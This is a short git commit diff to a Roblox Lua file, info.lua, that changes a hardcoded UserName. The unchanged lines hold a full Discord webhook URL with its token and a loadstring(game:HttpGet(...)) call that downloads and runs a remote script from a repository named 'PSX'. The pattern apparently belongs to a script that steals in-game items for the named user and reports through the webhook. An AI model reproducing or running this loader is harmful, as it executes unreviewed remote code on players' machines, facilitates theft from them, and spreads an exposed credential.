3468e6a8c0e92b132dd5465e6e2794c946696146
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-09 18:22:42 +0200

    Update info.lua

--- info.lua
+++ info.lua
@@ -1,4 +1,4 @@
-UserName = "dawidparuw"
+UserName = "psxplayer12345678911"
 WebHook = "https://discord.com/api/webhooks/1050801826158616597/sSXvnPpnt0-VBF6r4GqV5hgJqljh1IkUCst93VRhpP7BpeB_Na1EOD3ATCuutblH0tir"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Maset0/PSX/main/info1.lua", true))()
